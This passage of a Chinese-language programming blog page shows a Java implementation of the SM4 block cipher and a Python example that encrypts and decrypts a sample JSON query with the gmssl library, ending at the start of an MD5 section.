class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SM4</span> &#123;<br>    <span class="hljs-type">int</span>[] key_r;<br><br>    <span class="hljs-comment">/* 初始化轮密钥 */</span><br>    SM4(<span class="hljs-type">byte</span>[] key) &#123;<br>        <span class="hljs-built_in">this</span>.key_r = keyGenerate(key);<br>    &#125;<br><br>    <span class="hljs-comment">/* 密钥拓展 */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[] keyGenerate(<span class="hljs-type">byte</span>[] key) &#123;<br>        <span class="hljs-type">int</span>[] key_r = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">32</span>];<span class="hljs-comment">//轮密钥rk_i</span><br>        <span class="hljs-type">int</span>[] key_temp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span> box_in, box_out;<span class="hljs-comment">//盒变换输入输出</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] FK = &#123;<span class="hljs-number">0xa3b1bac6</span>, <span class="hljs-number">0x56aa3350</span>, <span class="hljs-number">0x677d9197</span>, <span class="hljs-number">0xb27022dc</span>&#125;;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] CK = &#123;<br>                <span class="hljs-number">0x00070e15</span>, <span class="hljs-number">0x1c232a31</span>, <span class="hljs-number">0x383f464d</span>, <span class="hljs-number">0x545b6269</span>,<br>                <span class="hljs-number">0x70777e85</span>, <span class="hljs-number">0x8c939aa1</span>, <span class="hljs-number">0xa8afb6bd</span>, <span class="hljs-number">0xc4cbd2d9</span>,<br>                <span class="hljs-number">0xe0e7eef5</span>, <span class="hljs-number">0xfc030a11</span>, <span class="hljs-number">0x181f262d</span>, <span class="hljs-number">0x343b4249</span>,<br>                <span class="hljs-number">0x50575e65</span>, <span class="hljs-number">0x6c737a81</span>, <span class="hljs-number">0x888f969d</span>, <span class="hljs-number">0xa4abb2b9</span>,<br>                <span class="hljs-number">0xc0c7ced5</span>, <span class="hljs-number">0xdce3eaf1</span>, <span class="hljs-number">0xf8ff060d</span>, <span class="hljs-number">0x141b2229</span>,<br>                <span class="hljs-number">0x30373e45</span>, <span class="hljs-number">0x4c535a61</span>, <span class="hljs-number">0x686f767d</span>, <span class="hljs-number">0x848b9299</span>,<br>                <span class="hljs-number">0xa0a7aeb5</span>, <span class="hljs-number">0xbcc3cad1</span>, <span class="hljs-number">0xd8dfe6ed</span>, <span class="hljs-number">0xf4fb0209</span>,<br>                <span class="hljs-number">0x10171e25</span>, <span class="hljs-number">0x2c333a41</span>, <span class="hljs-number">0x484f565d</span>, <span class="hljs-number">0x646b7279</span><br>        &#125;;<br>        <span class="hljs-comment">//将输入的密钥每32比特合并，并异或FK</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            key_temp[i] = jointBytes(key[<span class="hljs-number">4</span> * i], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]);<br>            key_temp[i] = key_temp[i] ^ FK[i];<br>        &#125;<br>        <span class="hljs-comment">//32轮密钥拓展</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>            box_in = key_temp[<span class="hljs-number">1</span>] ^ key_temp[<span class="hljs-number">2</span>] ^ key_temp[<span class="hljs-number">3</span>] ^ CK[i];<br>            box_out = sBox(box_in);<br>            key_r[i] = key_temp[<span class="hljs-number">0</span>] ^ box_out ^ shift(box_out, <span class="hljs-number">13</span>) ^ shift(box_out, <span class="hljs-number">23</span>);<br>            key_temp[<span class="hljs-number">0</span>] = key_temp[<span class="hljs-number">1</span>];<br>            key_temp[<span class="hljs-number">1</span>] = key_temp[<span class="hljs-number">2</span>];<br>            key_temp[<span class="hljs-number">2</span>] = key_temp[<span class="hljs-number">3</span>];<br>            key_temp[<span class="hljs-number">3</span>] = key_r[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> key_r;<br>    &#125;<br><br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] sm4Main(<span class="hljs-type">byte</span>[] input, <span class="hljs-type">int</span>[] key_r, <span class="hljs-type">int</span> mod) &#123;<br>        <span class="hljs-type">int</span>[] text = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<span class="hljs-comment">//32比特字</span><br>        <span class="hljs-comment">//将输入以32比特分组</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            text[i] = jointBytes(input[<span class="hljs-number">4</span> * i], input[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], input[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], input[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]);<br>        &#125;<br>        <span class="hljs-type">int</span> box_input, box_output;<span class="hljs-comment">//盒变换输入和输出</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (mod == <span class="hljs-number">0</span>) ? i : (<span class="hljs-number">31</span> - i);<span class="hljs-comment">//通过改变key_r的顺序改变模式</span><br>            box_input = text[<span class="hljs-number">1</span>] ^ text[<span class="hljs-number">2</span>] ^ text[<span class="hljs-number">3</span>] ^ key_r[index];<br>            box_output = sBox(box_input);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> text[<span class="hljs-number">0</span>] ^ box_output ^ shift(box_output, <span class="hljs-number">2</span>) ^ shift(box_output, <span class="hljs-number">10</span>) ^ shift(box_output, <span class="hljs-number">18</span>) ^ shift(box_output, <span class="hljs-number">24</span>);<br>            text[<span class="hljs-number">0</span>] = text[<span class="hljs-number">1</span>];<br>            text[<span class="hljs-number">1</span>] = text[<span class="hljs-number">2</span>];<br>            text[<span class="hljs-number">2</span>] = text[<span class="hljs-number">3</span>];<br>            text[<span class="hljs-number">3</span>] = temp;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-comment">//将结果的32比特字拆分</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            System.arraycopy(splitInt(text[<span class="hljs-number">3</span> - i]), <span class="hljs-number">0</span>, output, <span class="hljs-number">4</span> * i, <span class="hljs-number">4</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> output;<br>    &#125;<br><br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] encrypt(<span class="hljs-type">byte</span>[] plaintext) &#123;<br>        <span class="hljs-keyword">return</span> sm4Main(plaintext, key_r, <span class="hljs-number">0</span>);<br>    &#125;<br><br>   <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] decrypt(<span class="hljs-type">byte</span>[] ciphertext) &#123;<br>        <span class="hljs-keyword">return</span> sm4Main(ciphertext, key_r, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* 将32比特数拆分成4个8比特数 */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] splitInt(<span class="hljs-type">int</span> n) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;(<span class="hljs-type">byte</span>) (n &gt;&gt;&gt; <span class="hljs-number">24</span>), (<span class="hljs-type">byte</span>) (n &gt;&gt;&gt; <span class="hljs-number">16</span>), (<span class="hljs-type">byte</span>) (n &gt;&gt;&gt; <span class="hljs-number">8</span>), (<span class="hljs-type">byte</span>) n&#125;;<br>    &#125;<br><br>    <span class="hljs-comment">/* 将4个8比特数合并成32比特数 */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">jointBytes</span><span class="hljs-params">(<span class="hljs-type">byte</span> byte_0, <span class="hljs-type">byte</span> byte_1, <span class="hljs-type">byte</span> byte_2, <span class="hljs-type">byte</span> byte_3)</span> &#123;<br>        <span class="hljs-keyword">return</span> ((byte_0 &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">24</span>) | ((byte_1 &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((byte_2 &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">8</span>) | (byte_3 &amp; <span class="hljs-number">0xFF</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* S盒变换 */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sBox</span><span class="hljs-params">(<span class="hljs-type">int</span> box_input)</span> &#123;<br>        <br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] SBOX = &#123;<br>                <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9A</span>,<br>                <span class="hljs-number">0x76</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xEF</span>,<br>                <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x80</span>,<br>                <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x19</span>,<br>                <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x9D</span>,<br>                <span class="hljs-number">0x35</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x40</span>,<br>                <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x55</span>,<br>                <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x23</span>,<br>                <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6C</span>,<br>                <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x0A</span>,<br>                <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x4A</span>,<br>                <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x4D</span>,<br>                <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x48</span><br>        &#125;;<br><br>        <span class="hljs-type">byte</span>[] temp = splitInt(box_input);<span class="hljs-comment">//拆分32比特数</span><br>        <span class="hljs-type">byte</span>[] output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];<span class="hljs-comment">//单个盒变换输出</span><br>        <span class="hljs-comment">//盒变换</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            output[i] = (<span class="hljs-type">byte</span>) SBOX[temp[i] &amp; <span class="hljs-number">0xFF</span>];<br>        &#125;<br>        <span class="hljs-comment">//将4个8位字节合并为一个字作为盒变换输出</span><br>        <span class="hljs-keyword">return</span> jointBytes(output[<span class="hljs-number">0</span>], output[<span class="hljs-number">1</span>], output[<span class="hljs-number">2</span>], output[<span class="hljs-number">3</span>]);<br>    &#125;<br><br>    <span class="hljs-comment">/* 将input左移n位 */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shift</span><span class="hljs-params">(<span class="hljs-type">int</span> input, <span class="hljs-type">int</span> n)</span> &#123;<br>        <span class="hljs-keyword">return</span> (input &gt;&gt;&gt; (<span class="hljs-number">32</span> - n)) | (input &lt;&lt; n);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>加解密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm4<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SM4</span>:<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.crypt_sm4 = sm4.CryptSM4()  <span class="hljs-comment"># 实例化</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">str_to_hexStr</span>(<span class="hljs-params">self , hex_str</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        字符串转hex</span><br><span class="hljs-string">        :param hex_str: 字符串</span><br><span class="hljs-string">        :return: hex</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        hex_data = hex_str.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        str_bin = binascii.unhexlify(hex_data)<br>        <span class="hljs-keyword">return</span> str_bin.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encryptSM4</span>(<span class="hljs-params">self , encrypt_key , value</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        国密sm4加密</span><br><span class="hljs-string">        :param encrypt_key: sm4加密key</span><br><span class="hljs-string">        :param value: 待加密的字符串</span><br><span class="hljs-string">        :return: sm4加密后的十六进制值</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        crypt_sm4 = self.crypt_sm4<br>        crypt_sm4.set_key(encrypt_key.encode() , sm4.SM4_ENCRYPT)  <span class="hljs-comment"># 设置密钥</span><br>        date_str = <span class="hljs-built_in">str</span>(value)<br>        encrypt_value = crypt_sm4.crypt_ecb(date_str.encode())  <span class="hljs-comment"># 开始加密。bytes类型</span><br>        <span class="hljs-keyword">return</span> encrypt_value.<span class="hljs-built_in">hex</span>()  <span class="hljs-comment"># 返回十六进制值</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decryptSM4</span>(<span class="hljs-params">self , decrypt_key , encrypt_value</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        国密sm4解密</span><br><span class="hljs-string">        :param decrypt_key:sm4加密key</span><br><span class="hljs-string">        :param encrypt_value: 待解密的十六进制值</span><br><span class="hljs-string">        :return: 原字符串</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        crypt_sm4 = self.crypt_sm4<br>        crypt_sm4.set_key(decrypt_key.encode() , sm4.SM4_DECRYPT)  <span class="hljs-comment"># 设置密钥</span><br>        decrypt_value = crypt_sm4.crypt_ecb(<span class="hljs-built_in">bytes</span>.fromhex(encrypt_value))  <span class="hljs-comment"># 开始解密。十六进制类型</span><br>        <span class="hljs-keyword">return</span> decrypt_value.decode()<br>        <span class="hljs-comment"># return self.str_to_hexStr(decrypt_value.hex())</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key = <span class="hljs-string">&quot;C3AE5873D08418DA&quot;</span><br>    strData = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;&quot;addr&quot;:&quot;&quot;,&quot;regnCode&quot;:&quot;320100&quot;,&quot;medinsName&quot;:&quot;&quot;,&quot;medinsLvCode&quot;:&quot;&quot;,&quot;medinsTypeCode&quot;:&quot;&quot;,&quot;openElec&quot;:&quot;&quot;,&quot;pageNum&quot;:6,&quot;pageSize&quot;:100&#125;&#x27;&#x27;&#x27;</span><br>    SM4 = SM4()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;原字符：&quot;</span> , strData)<br>    encData = SM4.encryptSM4(key , strData)  <span class="hljs-comment"># 加密后的数据，返回bytes类型</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sm4加密结果：&quot;</span> , encData)<br><br>    decData = SM4.decryptSM4(key , encData)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sm4解密结果：&quot;</span> , decData)  <span class="hljs-comment"># 解密后的数据</span><br></code></pre></td></tr></table></figure><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p>[<a 